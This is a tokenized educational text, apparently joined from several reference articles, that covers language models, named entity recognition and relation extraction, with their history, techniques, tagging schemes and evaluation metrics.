This is an approximation in which only some recent words matter .
For a bigram model , a word is predicted based on only the preceding word .
For an n - gram model , only the preceding ( n-1 ) words are considered .
For instance , given a bigram model for the phrase " the cat sat on the mat " , \(P(S)=P(the)\cdot P(cat|the)\cdot P(sat|cat)\cdot P(on|sat)\cdot P(the|on)\cdot P(mat|the)\ ) .
We can get these probabilities by counting word co - occurrences .
For example , \(P(cat|the)=P(the\,cat)/P(the)\ ) .
One problem with n - gram models is data sparsity .
This means that word sequences not seen in training , may be encountered in real applications , leading to zero probability .
Techniques to solve this problem include smoothing , backoff and interpolation .
Typically , 5-gram models are a compromise between computational complexity and performance .
How can I train or make use of a neural language model ?
Pre - train a LM , transfer that learning , and fine - tune it for a specific task .
Source : Casas 2019 , slide 6 .
A neural language model can be learned in an unsupervised or semi - supervised manner , but it needs lots of input text .
The easy availability of text online ( billions of words ) has made this feasible .
However , words at the input of a neural network must be represented as numbers .
This is where word embeddings provide efficient representations .
To train the LM itself , we need a task on which the model has to learn .
One task is to predict a word given its surrounding words ; or predict the surrounding words given the current word .
In fact , these two LM tasks were used when creating word2vec word embeddings .
Training an LM in this manner is called pre - training .
A pre - trained LM can then be applied to a variety of NLP tasks .
However , since each task is different , we do task - specific fine - tuning of the LM .
This two - phase approach is practical since a single pre - trained LM can be fine - tuned as the task demands .
While pre - training is done on huge volumes of text , fine - tuning takes a lot less effort .
Could you describe some well - known pre - trained neural language models ?
Comparing some popular neural language models .
Source : Casas 2019 , slide 7 .
Among the well - known NLMs are ELMo , ULMFiT , BERT , GPT , and GPT-2 .
BERT , in particular , has spawned many variants : XLM , RoBERTa , XLNet , MT - DNN , TinyBERT , ALERT , DistilBERT , and more .
While ELMo and ULMFiT use LSTM , GPT-2 and BERT are based on transformer architecture .
ULMFiT and GPT-2 are unidirectional while BERT is bidirectional .
Most models can be applied to any downstream NLP task .
LM pre - training tasks themselves differ across models : Causal LM : Used by GPT-2 .
My current prediction is based on previous hidden state .
Masked LM : Used by BERT .
Some input words are masked and the task is to predict them .
Since the model is bidirectional , masking improves performance .
Translation LM : Used by XLM for better machine translation .
An input sequence contains tokens from both languages , each with its own language embeddings and position embeddings .
Permutation LM : Used by XLNet .
It uses permutation to capture a bidirectional context .
Multi - Task LM : Used by MT - DNN .
The model is trained on multiple tasks such as classification , text similarity and pairwise ranking .
This regularizes the model better .
Which are the common techniques used in neural language models ?
Models with more parameters or memory units perform better .
Increasing the embedding size improves performance but causes an undesirable increase in the number of parameters .
LSTMs are better than RNNs .
LSTMs are much better than n - grams on rare words .
Models tend to overfit on training data , for which dropout helps ( 10 % for small models , 25 % for large models ) .
Character - level embeddings and softmax can reduce the number of parameters .
They 're also better at out - of - vocabulary words .
To predict the next word , we need to compute the softmax probability .
This is expensive for a large vocabulary .
Among the different approaches to simplifying this are hierarchical softmax , noise contrastive estimation , importance sampling , and self - normalizing partition functions .
To handle rare words , there are neural LMs that make use of morphemes , word shape information ( such as capitalization ) , or annotations ( such as POS tags ) .
The use of morphemes has led to morpheme embeddings .
When combined with RNN , we obtain word embeddings .
Some LMs use character - level embeddings at both input and/or output .
This approach avoids morphological analysis .
How can I evaluate the performance of language models ?
Performance of some popular LMs .
Source : Aßenmacher and Heumann 2020 , table 7 .
The common measure of LM evaluation is called perplexity .
It 's a geometric average of the inverse probability of words predicted by the model .
Thus , a lower perplexity implies a better model .
Logarithm ( base 2 ) of perplexity is also a common measure .
This is called cross - entropy .
As a thumb rule , a reduction of 10 - 20 % in perplexity is noteworthy .
In practice , an LM is measured by how it performs in an actual application .
This is called extrinsic evaluation , as opposed to perplexity that 's seen as intrinsic evaluation .
For example , in speech recognition , Word Error Rate ( WER ) is an extrinsic measure of an LM .
It 's been difficult to compare LMs because they use different training corpora or evaluation benchmarks .
Some published results are unclear about the computation complexity .
Sometimes single - model performance numbers are not reported ; only the performance of ensemble models is reported .
Language modelling can benefit from standardized pre - training corpus .
Performance should be compared along with model size and resource consumption .
Although smoothing techniques can be traced back to Lidstone ( 1920 ) , or even earlier to Laplace ( 18th century ) , an early application of smoothing to n - gram models for NLP is by Jelinek and Mercer ( 1980 ) .
A better smoothing technique is due to Katz ( 1987 ) .
More smoothing techniques were proposed in the 1990s .
Bahl et al .
propose a decision tree for language modelling in the domain of speech recognition .
Each node has a yes / no question about the preceding words .
Each leaf has a probability of distribution over the allowable vocabulary .
Years later , it 's noted that tree - based methods may outperform n - gram models , but finding the right partitions is hard due to high computational cost and data sparsity .
As decision tree approaches , as the tree grows , each leaf contains fewer data points .
This data fragmentation issue can be solved by exponential models .
Pietra et al .
propose one such model using Maximum Entropy distribution .
Similar models are proposed in the following years .
In general , these models are computationally intensive .
N - gram models look at the preceding ( n-1 ) words , but for larger n , there 's a data sparsity problem .
Huang et al .
propose a skipping n - gram model in which some preceding words may be ignored or skipped .
For example , in the phrase " Show John a good time " , the last word would be predicted based on P(time|Show a good ) rather than P(time|Show John a good ) .
Many such skipping models were proposed through the 1990s .
Due to the success of n - gram models , researchers ignored knowledge - based approaches .
A statistical approach eclipsed linguistic approach .
N - gram models worked but had little knowledge of language or its deep structures .
Well - known researcher Fred Jelinek notes that a combination of statistical and linguist approaches may be required .
He notes that we must " put language back into language modeling " .
As a smoothing technique for LMs , the Kneser - Ney method was proposed in 1995 .
Chen and Goodman introduce a modification of this and name it Modified Kneser - Ney Smoothing .
Unlike the single discount of Kneser - Ney , the modified method uses different discounts for one , two and more than two counts .
Subsequently , Kneser - Ney smoothing on a 5-gram model became a popular baseline among researchers .
Neural network with word vector C(i ) for ith word .
Source : Bengio et al .
2003 , fig .
1 .
Bengio et al .
point out the curse of dimensionality where the large vocabulary size of natural languages makes computations difficult .
They propose a Feedforward Neural Network ( FNN ) that jointly learns the language model and vector representations of words .
They refine their methods in a follow - up paper from 2003 .
Use of RNN for LM .
Source : Noaman et al .
2018 , fig .
4 .
Since n - grams and FNNs use a fixed length context , Mikolov et al .
propose using a Recurrent Neural Network ( RNN ) for language modelling .
Using cyclic connections , information on RNNs is retained for a longer time .
RNNs can therefore capture long - term dependencies .
Only the size of the hidden context layers needs to be fixed .
In 2018 , Noaman et al .
extend this approach to better suit languages with rich morphology or large vocabulary .
They tokenize a word into prefixes , stems and suffixes .
Two LM tasks were used in creating the word2vec .
Source : Rong 2016 , fig .
2 and 3 .
At Google , Mikolov et al .
develop a word embedding called word2vec .
This is created by training the model on one of two LM tasks : continuous bag - of - words ( predict current word based on surrounding words ) or continuous skip - gram ( predict surrounding words given current word ) .
This is a log - linear model due to the use of hierarchical softmax .
Convolutional of input character embeddings and word - level predictions .
Source : Kim et al .
2015 , fig .
1 .
Kim et al .
use character - level input embeddings .
Input is fed into CNN , followed by a highway network .
An LSTM layer does the predictions , which are still at word level .
They show that these character - level models have fewer parameters and outperform word - level models , particularly for languages with rich morphology ( Arabic , Czech , French , German , Spanish , Russian ) .
In 2016 , Jozefowicz et al .
explore CharCNN and character - level LSTM at the prediction layer .
Word embeddings such as word2vec have been popular since their release in 2013 .
However , they ca n't handle polysemy ( same word , different meanings ) .
This is because they produce a single representation of the word .
They capture semantic relations but are poor at higher - level concepts such as anaphora , long - term dependencies , agreement , and negation .
This is where LMs become useful .
A good LM should capture lexical , syntactic , semantic and pragmatic aspects .
NLP researcher Sebastian Ruder notes , It is very likely that in a year 's time , NLP practitioners will download pretrained language models rather than pretrained word embeddings .
Devlin et al .
from Google published details of an LM they call BERT .
It 's deeply bidirectional , meaning that it uses both left and right contexts in all layers .
In November , Google open sources pre - trained BERT models , along with TensorFlow code that does this pre - training .
These models are for English .
Later in November , Google will release a multilingual BERT that supports about 100 different languages .
Cross - lingual LM is proposed for machine translation .
Source : Lample and Conneau 2019 , fig .
1 .
Lample and Conneau adapt BERT to propose a cross - lingual LM .
The model is trained on both monolingual data ( unsupervised ) and parallel data ( supervised ) .
At the input , each language gets its own language and position embeddings .
The model uses Byte - Pair Encoding ( BPE ) in which sub - words are the tokens .
This improves the alignment of embedding spaces across languages .
They obtain state - of - the - art results .
Here are some new applications for LM .
LM enables end - to - end Named Entity Recognition and Relation Extraction , and thereby avoids external NLP tools such as a dependency parser .
LM is applied to zero - shot text classification .
This work suggests that LMs can be used for meta - learning .
A convolutional quantum - like LM is used for product rating prediction .
LM uses RNN along with a deep topic model to capture both syntax and global semantic structure .
Sample text tagged with named entities ( some tags are wrong ) .
Source : Vyas 2018 .
Named Entity Recognition ( NER ) is an essential task of the more general discipline of Information Extraction ( IE ) .
To obtain structured information from unstructured text , we wish to identify named entities .
Anything with a proper name is a named entity .
This would include names of people , places , organizations , vehicles , facilities , and so on .
While temporal and numerical expressions are not about entities per se , they 're important in understanding unstructured text .
Hence , such expressions are included in NER .
The essence of NER is to identity the named entities and also classify them .
NLP techniques used for POS tagging and syntactic chunking are applicable to NER .
NER models trained on general newswire texts are not suitable for specialized domains , such as law or medicine .
Domain - specific training is required .
Which are the common entity types identified by NER ?
Name entity types used in spaCy Python package .
Source : spaCy API 2020 .
At its simplest , NER recognizes three entity classes : location , person , and organization .
In practice , at least for newswire text , there 's value in extracting geo - political entities , date , time , currency , and percents .
For more fine - grained NER , systems may identify ordinal / cardinal numbers , events , works of art , facilities , products , and so on .
Temporal expressions can be absolute or relative .
For example , ' summer of 1977 ' and ' 10:15 AM ' are absolute whereas ' yesterday ' and ' last quarter ' are relative .
The expression ' four hours ' is an example of duration .
Specialized domains often require additional or alternative entity types .
In biomedical for example , we can broadly define six types : Cell , Chemical , Disease , Gene ( DNA or RNA ) , Protein and Species .
For question answering , Sekine defined a hierarchy of more than 200 entities .
Could you describe some applications of NER ?
Tweet analysis includes named entities ( green nodes ) .
Source : Lyon 2017 .
Given the huge volume of content published online each day , NER helps in categorizing them and thus eases search and content discovery .
In fact , for information retrieval , named entities can be used as search indices to speech up search .
Likewise , NER helps organize and categorize research publications .
For example , from the thousands of papers on machine learning , we might be interested only in face detection that uses CNN .
Content recommendation is possible with NER .
Based on the entities in the current article , the reader can recommend related articles .
Another NER application is online customer support .
NER can identify product type , model number , store location , and more .
Opinion mining uses NER as a pre - processing task .
NER can help link related concepts and entities to the Semantic Web .
One developer took 30,000 online recipes but found that the descriptions did n't fit any particular pattern .
He therefore applied NER with entity types Name , Quantity , and Unit .
He manually labelled 1500 samples of about 10,000 tokens .
Among the NLP tasks that benefit from NER are question generation , relation extraction , and coreference resolution .
What are the typical challenges with NER ?
The name ' Washington ' can refer to different entity types .
Source : Jurafsky and Martin 2009 , fig .
22.4 .
Ambiguities make NER a challenging task .
For example , ' JFK ' can refer to former US President John F. Kennedy or his son .
These are different entities of the same type .
Coreference resolution is an NLP task that resolves this ambiguity .
More common than NER is when the same name refers to different types .
For example , ' JFK ' can refer to the airport in New York or Oliver Stone 's 1991 movie .
Since entities can span multiple words / tokens , NER needs to identify the start and end of multi - token entities .
A name within a name ( such as Cecil H. Green Library ) is also a challenge .
When a word is a qualifier , it may be wrongly tagged .
For example , in the Clinton government , an NER system may tag Clinton as PER without recognizing the noun phrase .
The same entity can appear in different forms .
Differences could be typographical ( nucleotide binding vs NUCLEOTIDE - BINDING ) , morphological ( localize vs localization ) , syntactic ( DNA translocation vs translocation of DNA ) , reduction ( secretion process vs secretion / ATP - binding activity ) , or abbreviated ( type IV secretory system vs T4SS ) .
What 's the typical processing pipeline in NER ?
Steps in statistical sequential approach to NER .
Source : Jurafsky and Martin 2009 , fig .
22.10 .
NER is typically a supervised task .
It needs annotated training data .
Features are defined .
From the annotated data , the ML model learns how to map these features to the entities .
NER can be seen as a sequence labelling problem since it identifies a span of tokens and classifies it as a named entity .
Thus , NER can be solved in a manner similar to POS tagging or syntactic phrase chunking .
Statistical models such as HMM , MEMM or CRF can be used .
Annotating data manually is slow .
A semi - automated approach is to give a file containing a set of patterns or rules .
Another approach is to start with an existing model and manually correct mistakes .
A practical approach is for a model to label unambiguous entities in the first pass .
Subsequent passes make use of already labelled entities to resolve ambiguities about other entities .
Essentially , iterative approaches that start with patterns , dictionaries or unambiguous entities start with high precision but low recall .
Recall is then improved with already tagged entities and feedback .
Manually annotated data is typically reserved for model evaluation .
What sort of features are useful for training an NER model ?
Some features are useful for NER .
Source : Jurafsky and Martin 2009 , fig .
22.6 .
The token and its stem are basic features of NER .
In addition , the POS tag and phrase chunk label give useful information .
Context from surrounding tokens , and their POS tags and chunk labels , are also useful inputs .
For example , ' Rev. ' , ' MD ' , or ' Inc. ' are good indicators of entities that precede or follow them .
The token 's shape or orthography is particularly useful .
This includes presence of numbers , punctuation , hyphenation , mixed cases , all caps , etc .
For example , A9 , Yahoo !
, IRA , and eBay are entities that can be identified by their shape .
While this is useful for newswire text , it 's less useful for blogs or text transcribed automatically from speech .
Also , there 's no case information in Chinese .
Gazetteers maintain a list of names of places and people .
The presence of a token in such a list can be a feature .
Maintaining such a list is often difficult .
Such a list is less useful for identifying people and organizations .
Likewise , domain - specific knowledge bases can be used and string matches with these bases can identify entities .
Examples include DBpedia , DBLP and ScienceWise .
How have neural networks influenced NER ?
Taxonomy of Deep Learning based NER .
Source : Li et al .
2018 , fig .
3 .
Linear statistical models used hand - crafted features and gazetteers .
It is hard to adapt to new tasks or domains .
Non - linear neural network models make use of word embeddings .
Early NN models used these embeddings along with hand - crafted features .
A neural network for NER typically has three components : word embedding layer , a context encoder layer , and a decoder layer .
Since NER is basically a sequence labelling task , RNN is suitable .
BiLSTM , in particular , is good at capturing context .
Since 2019 , transformer architecture has been successfully applied to NER .
Multi - task learning ( MTL ) is an approach in which the model is trained on different tasks and representations are shared across tasks .
For NER , character - level representations obtained via CNN or transformer are useful since they encode morphological features , alleviate out - of - vocabulary issues and overcome data sparsity problems .
Neural networks are used by NeuroNER ( LSTM ) , spaCy ( CNN ) , and AllenNLP ( Bidirectional LM ) .
How are words or phrases tagged with their identities in NER ?
Illustrating some tagging schemes for NER .
Source : Baldwin 2009 .
Entities have to be tagged in a manner that 's suitable for algorithms to process .
There are many tagging schemes available , some of which evolved from those used in chunking : IO : The simplest scheme , where I_X identifies the named entity type X and O indicates no entity .
IOB : Where an entity has multiple tokens , this differently tags the beginning token ( B ) from an inner token ( I ) .
A variation of this is IOB2 or BIO .
BMEWO : This differently tags the beginning token ( B ) , middle token ( M ) , end token ( E ) , and a single - token entity ( W ) .
An extension of this with more tags is called BMEWO+ .
Another scheme that 's similar is called BILOU , where the letters stand for begin , inner , last , out and unit .
These encoding schemes have different complexities .
For N entities , IO , BIO and BMEWO have a complexity of N+1 , 2N+1 and 4N+1 tags respectively .
While BIO has been a popular choice , more recent work has shown that BILOU outperforms BIO .
Spacy supports IOB and BILUO schemes .
How do we evaluate algorithms for NER ?
F1 scores on English NER datasets .
Source : Yan et al .
2019 , table 3 .
Recall and precision are the basic metrics for evaluating NER models .
Recall gives the ratio of correctly labelled entities to the total that should have been labelled .
Precision is the ratio of correctly labelled entities to the total labelled .
The F - measure is a single metric that combines both recall and precision .
One caveat in using these metrics is the scope .
In a real application , they have to be applied to actual named entities .
Typical ML models optimize performance at the tag level , based on a particular encoding scheme .
Performance at these two levels can be quite different .
Tagging details also matter .
For example , in one study , training data did not include titles ( Prime Minister , Pope , etc .
) but Amazon Comprehend included these , thus leading to higher recall but lower precision .
Different annotated datasets sometimes disagree about entities .
For example , in " Baltimore defeated the Yankees " , MUC-7 tags Balimore as LOC whereas CoNLL2003 tags it as ORG .
CoNLL2003 and OntoNotes 5.0 are commonly used for training and evaluating models .
AllenNLP used the One Billion Word Benchmark .
What resources are available for research into NER ?
The ELI5 Python package helps us visualize CRF model weights .
Source : Li 2018 .
As part of the GATE framework ( University of Sheffield , UK ) for text processing , ANNIE is an NER pipeline .
Researchers can try out the online demo plus a free API .
displaCy from Explosion is a useful visualization tool .
Prodigy is an annotation tool for creating training data .
NER is one of the supported tasks .
A 2018 survey lists English NER datasets and tools .
Cloud providers also offer APIs for NER .
Google 's Natural Language API is an example .
This API can also figure out the sentiments about the entities .
An equivalent offering from Amazon is Amazon Comprehend .
Stanford NER is a Java implementation .
It 's also called CRFClassifier because it 's based on the linear chain CRF sequence model .
Via Stanford CoreNLP , this can be invoked from other languages .
More generally , packages that support HMM , MEMM , or CRF can be used to train an NER model .
Such support is available in Mallet , NTLK , and Stanford NER .
A Scikit - Learn compatible package that 's useful is ` sklearn - crfsuite ` .
Polyglot is capable of doing NER for 40 different languages .
Features for extracting company names .
Source : Rau 1994 .
Lisa Rau implements an algorithm to extract company names from financial news .
It 's a combination of heuristics , exception lists and extensive corpus analysis .
In subsequent retrieval tasks , the algorithm also looks at the most likely variations of names .
In 1992 , she filed for a US patent , which was granted in 1994 .
Sample annotation of named entities using SGML .
Source : Grishman and Sundheim 1996 , fig .
1 .
The term Named Entity was first used at the 6th Message Understanding Conference ( MUC ) .
The first MUC was held in 1987 with the aim of automating analysis of text messages in the military .
While early MUC events focused on mainly template filling , MUC-6 looks at sub - tasks that would aid information extraction .
It 's in this context that named entities become relevant .
SGML is used to markup entities .
During 1996 - 2008 , NER was talked about in MUC , CoNLL and ACE conferences .
Hammerton applies Long Short - Term Memory ( LSTM ) neural network to NER .
He finds significantly better performance for German but a disappointing baseline performance for English .
Words and their sequences are represented using SARDNET .
The algorithm operates in two passes .
In the first pass , information is gathered .
In the second pass , the algorithm disambiguates and outputs the named entities .
NER has dropped from international evaluation forums .
In fact , by 2005 , NER was considered a solved problem , with models achieving recall and precision exceeding 90 % .
However , the best score on ACE 2008 is only about 50 % , which is significantly lower than the scores for MUC and CoNLL2003 tasks .
This suggests that NER is not a solved problem .
Ratinov and Roth address some design challenges for NER .
They note that NER is knowledge - intensive in nature .
Therefore , they use 30 gazetteers , 16 of which are extracted from Wikipedia .
In general , these are high - precision , low - recall lists .
They are shown to be effective for webpages , where there 's less contextual information .
Expressive features and gazetteers enable unsupervised learning .
They also note the BILOU encoding significantly outperforms BIO .
Tweets have the problem of insufficient information .
NER models trained on news articles also do poorly on tweets .
This can be solved by domain adaptation or semi - supervised learning from lots of unlabelled data .
Liu et al .
approach this problem with a combination of K - Nearest Neighbour ( KNN ) classifier and Conditional Random Field ( CRF ) labeller .
KNN captures global coarse evidence while CRF captures fine - grained information from a single tweet .
The classifier is retrained based on recently labelled tweets .
Gazetteers are also used .
To avoid task - specific engineering and hand - crafted features , Collobert et al .
propose a unified neural network approach that can perform part - of - speech tagging , chunking , named entity recognition , and semantic role labelling .
The model learns representations from lots of unlabelled data .
The best results for NER are obtained with word embedding from a trained language model and optimizing for sentence - level log - likelihood .
This work motivates other researchers towards neural networks in preference to hand - crafted features .
Santos and Guimarães extend the work of Collobert et al .
by considering character - level representations using a convolutional layer .
They note that " word - level embeddings capture syntactic and semantic information , character - level embeddings capture morphological and shape information " .
The use of both gives the best results .
Huang et al .
study the use of LSTM and CRF for sequence labelling .
They find that BiLSTM with a CRF layer gives state - of - the - art results for POS tagging , chunking and NER .
With BiLSTM , past ( forward states ) and future ( backward states ) features are used .
CRF works at the sentence level to predict the current entity label based on past and future labels .
This model shows good performance even when Collobert et al .
The word embedding is not used .
For faster training , spelling and context features bypass the BiLSTM and go directly to the CRF layer .
Neural network for NER using CNN , LSTM , CRF and char+word embeddings .
Source : Ma and Hovy 2016 , fig .
1 and 3 .
Ma and Hovy achieved a state - of - the - art F1 score of 91.21 for NER on the CoNLL 2003 dataset .
Their approach requires no feature engineering or specific data pre - processing .
They use CNN to obtain character - level representations to capture morphological features such as prefixes and suffixes .
GloVe word embeddings are used .
Character embeddings are randomly initialized and then used to obtain character - level representations .
Chiu and Nichols present a similar work that also uses word - level features .
Concatenation of three different embeddings .
Source : Güngör et al .
2018 , fig.3 .
Güngör et al .
study NER for morphologically rich languages such as Turkish , Finnish , Czech and Spanish .
Word morphology is important for these languages .
This is in contrast to English that gets useful information from syntax and word n - grams .
They therefore propose a model that uses morphological embedding .
This is combined with character - based and word embedding .
Both character - based and morphological embeddings are derived using separate BiLSTMs .
Different architectures based on character / word / BERT representations .
Source : Francis et al .
2019 , fig .
1 .
Francis et al .
make use of the BERT language model for transfer learning in NER .
For fine tuning , either softmax or CRF layer is used .
They find BERT representations perform best in combination with character - level representation and word embedding .
Without BERT , they also show competitive performance when character - level representation and word embeddings are gated via an attention layer .
Transformer architecture of TENER for character - level encoding and word - level context .
Source : Yan et al .
2019 , fig .
2 .
Yan et al .
note that the traditional transformer architecture is not quite as good for NER as it is for other NLP tasks .
They customize transformer architecture and achieve state - of - the - art results , beating prevailing BiLSTM models .
They call it Transformer Encoder for NER ( TENER ) .
While traditional transformer uses position embedding , directionality is lost .
TENER uses relative position encoding to capture distance and direction .
Smoothing and scaling of traditional transformers is seen to attend to noisy information .
TENER therefore uses sharp unscaled attention .
Consider the phrase " President Clinton was in Washington today " .
This describes the relationship between Clinton and Washington .
Another example is " Steve Balmer , CEO of Microsoft , said … " , which describes a role relationship of Steve Balmer within Microsoft .
The task of extracting semantic relations between entities in a text is called Relation Extraction ( RE ) .
While Named Entity Recognition ( NER ) is about identifying entities in text , RE is about finding the relations among the entities .
Given unstructured text , NER and RE help us obtain useful structured representations .
Both tasks are part of the discipline of Information Extraction ( IE ) .
Supervised , semi - supervised , and unsupervised approaches exist to doing RE .
In the 2010s , neural network architectures were applied to RE .
Sometimes the term Relation Classification is used , particularly in approaches that treat it as a classification problem .
What sort of relations are captured in relation to extraction ?
Relation types and sub - types in ACE 2003 and ACE 2004 datasets .
Source : Pawar et al .
2017 , fig .
1 .
Here are some relations with examples : located - in : CMU is in Pittsburgh father - of : Manuel Blum is the father of Avrim Blum person - affiliation : Bill Gates works at Microsoft Inc. capital - of : Beijing is the capital of China part - of : American Airlines , a unit of AMR Corp. , immediately matched the move In general , affiliations involve persons , organizations or artifacts .
Geospatial relations involve locations .
Some relations involve organizations or geo - political entities .
Entity tuple is the common way to represent entities bound in a relationship .
Given n entities in a relation r , the notation is \(r(e_{1},e_{2}, ... ,e_{n})\ ) .
An example use of this notation is Located - In(CMU , Pittsburgh ) .
RE mostly deals with binary relations where n=2 .
For n>2 , the term used is higher - order relations .
An example of 4-ary biomedical relation is point_mutation(codon , 12 , G , T ) , in the sentence " At codons 12 , the occurrence of point mutations from G to T were observed " .
What are some common applications of relationship extraction ?
Protein - Organism - Location ternary relation in a biomedical application .
Source : Liu et al .
2007 , fig .
2 .
Since structured information is easier to use than unstructured text , relation extraction is useful in many NLP applications .
RE enriches existing information .
Once relations are obtained , they can be stored in databases for future queries .
They can be visualized and correlated with other information in the system .
In question answering , one might ask " When was Gandhi born ?
" Such a factoid question can be answered if our relations database has stored the relationship Born - In(Gandhi , 1869 ) .
In the biomedical domain , protein binding relations can lead to drug discovery .
When relations are extracted from a sentence such as " Gene X with mutation Y leads to malignancy Z " , these relations can help us detect cancerous genes .
Another example is to know the location of a protein in an organism .
This ternary relationship is split into two binary relations ( Protein - Organism and Protein - Location ) .
Once these are classified , the results are merged into a ternary relationship .
Which are the main techniques for doing relationship extraction ?
Learning process for supervised RE .
Source : Jung et al .
2012 , fig .
1 .
With supervised learning , the model is trained on annotated text .
Entities and their relations are annotated .
Training involves a binary classifier that detects the presence of a relation , and a classifier to label the relation .
For labelling , we could use SVMs , decision trees , Naive Bayes or MaxEnt .
Two types of supervision are feature - based or kernel - based .
Since finding large annotated datasets is difficult , a semi - supervised approach is more practical .
One approach is to do a phrasal search with wildcards .
For example , ` [ ORG ] has a hub at [ LOC ] ` would return organizations and their hub locations .
If we relax the pattern , we 'll get more matches but also false positives .
An alternative is to use a set of specific patterns , induced from an initial set of seed patterns and seed tuples .
This approach is called bootstrapping .
For example , given the seed tuple hub(Ryanair , Charleroi ) , we can discover many phrasal patterns in unlabelled text .
Using these patterns , we can discover more patterns and tuples .
However , we have to be careful of semantic drift , in which one wrong tuple / pattern can lead to further errors .
What sort of features are useful for relationship extraction ?
Possible features when classifying the tuple ( American Airlines , Tim Wagner ) .
Source : Jurafsky and Martin 2009 , fig .
22.15 .
Supervised learning uses features .
The named entities themselves are useful features .
This includes an entity 's bag of words , head words and its entity type .
It 's also useful to look at words surrounding the entities , including words that are in between the two entities .
Stems of these words can also be included .
The distance between the entities could be useful .
The syntactic structure of the sentence can signal the relations .
A syntax tree could be obtained via base - phrase chunking , dependency parsing or full constituent parsing .
The paths in these trees can be used to train binary classifiers to detect specific syntactic constructions .
The accompanying figure shows possible features in the sentence " [ ORG American Airlines ] , a unit of AMR Corp. , immediately matched the move , spokesman [ PERS Tim Wagner ] said .
" When using syntax , expert knowledge of linguistics is needed to know which syntactic constructions correspond to which relations .
However , this can be automated via machine learning .
Could you explain kernel - based methods for supervised relation classification ?
Unlike feature - based methods , kernel - based methods do n't require explicit feature engineering .
They can explore a large feature space in polynomial computation time .
The essence of a kernel is to compute the similarity between two sequences .
A kernel could be designed to measure structural similarity of character sequences , word sequences , or parse trees involving the entities .
In practice , a kernel is used as a similarity function in classifiers such as SVM or Voted Perceptron .
We note a few kernel designs : Subsequence : Uses a sequence of words made of the entities and their surrounding words .
Word representation includes POS tag and entity type .
Syntactic Tree : A constituent parse tree is used .
Convolution Parse Tree Kernel is one way to compare the similarity of two syntactic trees .
Dependency Tree : Similarity is computed between two dependency parse trees .
This could be enhanced with shallow semantic parsers .
A variation is to use dependency graph paths in which the shortest path between entities represents a relation .
Composite : Combines the above approaches .
Subsequence kernels capture lexical information whereas tree kernels capture syntactic information .
Could you explain the distant supervised approach to relationship extraction ?
Typical pipeline for distantly supervised relationship extraction .
Source : Herman 2019 .
Due to extensive work done for Semantic Web , we already have many knowledge bases that contain ` entity - relation - entity ` triplets .
Examples include DBpedia ( 3 K relations ) , Freebase ( 38 K relations ) , YAGO , and Google Knowledge Graph ( 35 K relations ) .
These can be used for relationship extraction without requiring annotated text .
Distant supervision is a combination of unsupervised and supervised approaches .
It extracts relations without supervision .
It also induces thousands of features using a probabilistic classifier .
The process starts by linking named entities to those in the knowledge bases .
Using relations in the knowledge base , the patterns are picked up in the text .
Patterns are applied to find more relations .
early work used DBpedia and Freebase , and Wikipedia as the text corpus .
Later work utilized semi - structured data ( HTML tables , Wikipedia list pages , etc .
) or even a web search to fill in gaps in knowledge graphs .
Could you compare some semi - supervised or unsupervised approaches of some related extraction tools ?
A comparison of some semi - supervised and unsupervised RE tools .
Source : Bach and Badaskar 2007b , slide 38 .
DIPRE 's algorithm ( 1998 ) starts with seed relations , applies them to text , induces patterns , and applies the patterns to obtain more tuples .
These steps are iterated .
When applied to ( author , book ) relation , patterns take the form ` ( longest - common - suffix of prefix strings , author , middle , book , longest - common - prefix of suffix strings ) ` .
DIPRE is an application of the Yarowsky algorithm ( 1995 ) invented for WSD .
Like DIPRE , Snowball ( 2000 ) uses seed relationships but does n't look for exact pattern matches .
Tuples are represented as vectors , grouped using similar functions .
Each term is also weighted .
Weights are adjusted with each iteration .
A snowball can handle variations in tokens or punctuation .
KnowItAll ( 2005 ) starts with domain - independent extraction patterns .
Relation - specific and domain - specific rules are derived from the generic patterns .
The rules are applied on a large scale on online text .
It uses pointwise mutual information ( PMI ) measure to retain the most likely patterns and relations .
Unlike earlier algorithms , TextRunner ( 2007 ) does n't require a pre - defined set of rules .
It learns relationships , classes and entities on its own from a large corpus .
How are neural networks being used to do relationship extraction ?
Self - attention to entities ' pollution ' and ' shipwrecks ' with Cause - Effect relation .
Source : Lee et al .
2019 , fig .
4 .
Neural networks were increasingly applied to relation extraction from the early 2010s .
Early approaches used Recursive Neural Networks that were applied to syntactic parse trees .
The use of Convolutional Neural Networks ( CNNs ) came next , to extract sentence - level features and the context surrounding words .
A combination of these two networks has also been used .
Since CNNs failed to learn long - distance dependencies , Recurrent Neural Networks ( RNNs ) were found to be more effective in this regard .
By 2017 , basic RNNs have given way to gated variants called GRU and LSTM .
A comparative study showed that CNNs are good at capturing local and position - invariant features whereas RNNs are better at capturing order information long - range context dependency .
The next evolution was towards attention mechanism and pre - trained language models such as BERT .
For example , the attention mechanism can pick out the most relevant words and use CNNs or LSTMs to learn relationships .
Thus , we do n't need explicit dependency trees .
In January 2020 , it was seen that BERT - based models represent the current state - of - the - art with an F1 score of close to 90 .
How do we evaluate algorithms for relationship extraction ?
Metrics used for evaluating supervised relation extraction .
Source : Bach and Badaskar 2007a , sec .
5.2 .
Recall , precision and F - measures are typically used to evaluate the gold - standard of human annotated relations .
These are typically used for supervised methods .
For unsupervised methods , it may be sufficient to check if a relationship has been captured correctly .
There 's no need to check if every mention of the relationship has been detected .
Precision here is simply the correct relations against all relations as judged by human experts .
Recall is more difficult to compute .
Gazetteers and web resources may be used for this purpose .
Could you mention some resources for working in relation to extraction ?
Papers With Code has useful links to recent publications on relations classifications .
GitHub has a topic page on relationship classifications .
Another useful resource is a curated list of papers , tutorials and datasets .
The current state - of - the - art is captured on the NLP - progress page of relation extraction .
Among the useful datasets for training or evaluation are ACE-2005 ( 7 major relation types ) and SemEval-2010 Task 8 ( 19 relation types ) .
For distant supervision , Riedel or NYT dataset was formed by aligning Freebase relations with the New York Times corpus .
There 's also Google Distant Supervision ( GIDS ) dataset and FewRel .
TACRED is a large dataset containing 41 relations types from newswires and web text .
At the 7th Message Understanding Conference ( MUC ) , the task of extracting relations between entities was considered .
Since this is considered as part of template filling , they call it template relations .
Relations are limited to organizations : employee_ofs , product_of , and location_of .
Snowball uses seed tuples as the starting point .
Source : Agichtein and Gravano 2000 , fig .
2 .
Agichtein and Gravano propose Snowball , a semi - supervised approach to generating patterns and extracting relations from a small set of seed relations .
At each iteration , it evaluates for quality and keeps only the most reliable patterns and relations .
Zelenko et al .
obtain shallow parse trees from text for use in binary relation classification .
They use contiguous and sparse subtree kernels to assess the similarity of two parse trees .
